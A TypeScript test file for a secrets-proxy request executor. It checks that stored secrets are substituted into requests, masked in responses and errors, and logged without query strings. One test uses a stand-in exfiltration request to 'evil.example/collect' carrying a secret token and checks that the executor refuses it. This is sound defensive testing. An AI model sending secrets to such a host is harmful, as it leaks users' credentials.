import { beforeEach, describe, expect, test } from "bun:test"
import { type FakeDbCall, secretRow, stepArgs } from "@nonete/db/testing"
import { encryptValues } from "#lib/cipher"
import { fakeDb } from "#tests/fixtures/db"
import { resetEnv, testEnv } from "#tests/fixtures/env"
import { executeRequest, type RequestCaller } from "#v1/secret/request/execute"
import type { FetchLike, SendOptions } from "#v1/secret/request/send"

const KEY = Buffer.alloc(32, 7).toString("base64")
const caller: RequestCaller = { userId: "user-id", apiKeyId: "key-1" }
const SECRET_ID = "00000000-0000-4000-8000-000000000001"
const komodoValues = { key: "komodo-key-value", secret: "komodo-secret-value" }

function komodo(overrides: Parameters<typeof secretRow>[0] = {}) {
  return secretRow({
    ciphertext: encryptValues(komodoValues, {
      secretId: SECRET_ID,
      userId: "user-id",
    }),
    allowInUrl: true,
    ...overrides,
  })
}

function options(fetch: FetchLike): SendOptions {
  return { fetch, timeoutMs: 1000, maxBodyBytes: 1024 * 1024 }
}

/** A service that answers with every header it received, as JSON. */
const echoHeaders: FetchLike = async (_url, init) =>
  Response.json(Object.fromEntries(new Headers(init.headers).entries()))

function usageValues(call: FakeDbCall | undefined) {
  if (!call) throw new Error("no usage recorded")
  return stepArgs(call, "values")[0]
}

const komodoGet = {
  method: "GET" as const,
  url: "https://komodo.casa.lan/read/stacks?token={{komodo.key}}",
  headers: { "X-Api-Secret": "{{komodo.secret}}" },
}

beforeEach(() => {
  fakeDb.reset()
  resetEnv()
  testEnv.SECRETS_ENCRYPTION_KEY = KEY
})

describe("executeRequest", () => {
  test("sends the values and masks them where the response echoes them", async () => {
    fakeDb.queue("select", [komodo()])
    fakeDb.queue("insert", undefined)
    fakeDb.queue("update", undefined)
    const urls: string[] = []
    const fetch: FetchLike = async (url, init) => {
      urls.push(url)
      return echoHeaders(url, init)
    }

    const result = await executeRequest(caller, komodoGet, options(fetch))

    expect(urls).toEqual([
      "https://komodo.casa.lan/read/stacks?token=komodo-key-value",
    ])
    if (!result.ok) throw new Error(result.message)
    expect(result.response.status).toBe(200)
    const text = JSON.stringify(result.response)
    expect(text).not.toContain("komodo-secret-value")
    expect(text).toContain("[secret:komodo.secret]")
  })

  test("records the call without the query and bumps the secret's last use", async () => {
    fakeDb.queue("select", [komodo()])
    fakeDb.queue("insert", undefined)
    fakeDb.queue("update", undefined)

    await executeRequest(caller, komodoGet, options(echoHeaders))

    expect(usageValues(fakeDb.calls("insert")[0])).toMatchObject({
      userId: "user-id",
      apiKeyId: "key-1",
      secretIds: [SECRET_ID],
      secretNames: ["komodo"],
      method: "GET",
      url: "https://komodo.casa.lan/read/stacks",
      outcome: "sent",
      status: 200,
      detail: null,
    })
    expect(
      JSON.stringify(usageValues(fakeDb.calls("insert")[0]))
    ).not.toContain("komodo-key-value")
    expect(fakeDb.calls("update")).toHaveLength(1)
  })

  test("a refused request sends nothing, is recorded as refused and bumps nothing", async () => {
    fakeDb.queue("select", [komodo()])
    fakeDb.queue("insert", undefined)
    let fetched = false
    const fetch: FetchLike = async () => {
      fetched = true
      return new Response("")
    }

    const result = await executeRequest(
      caller,
      { ...komodoGet, url: "https://evil.example/collect?t={{komodo.key}}" },
      options(fetch)
    )

    expect(result.ok).toBe(false)
    expect(fetched).toBe(false)
    expect(usageValues(fakeDb.calls("insert")[0])).toMatchObject({
      outcome: "refused",
      secretNames: ["komodo"],
      url: "https://evil.example/collect",
    })
    expect(fakeDb.calls("update")).toEqual([])
  })

  test("a failure is masked, in the result and in the log", async () => {
    fakeDb.queue("select", [komodo()])
    fakeDb.queue("insert", undefined)
    fakeDb.queue("update", undefined)
    const fetch: FetchLike = async (url) => {
      throw new Error(`could not connect to ${url}`)
    }

    const result = await executeRequest(caller, komodoGet, options(fetch))

    if (result.ok) throw new Error("expected a failure")
    expect(result.message).toContain("token=[secret:komodo.key]")
    expect(result.message).not.toContain("komodo-key-value")
    expect(usageValues(fakeDb.calls("insert")[0])).toMatchObject({
      outcome: "failed",
      status: null,
    })
    expect(
      JSON.stringify(usageValues(fakeDb.calls("insert")[0]))
    ).not.toContain("komodo-key-value")
  })

  test("refuses a secret of the caller's that can't be decrypted", async () => {
    fakeDb.queue("select", [komodo({ ciphertext: "AAAA" })])
    fakeDb.queue("insert", undefined)

    const result = await executeRequest(caller, komodoGet, options(echoHeaders))

    if (result.ok) throw new Error("expected a refusal")
    expect(result.message).toContain("can't be decrypted")
  })
})
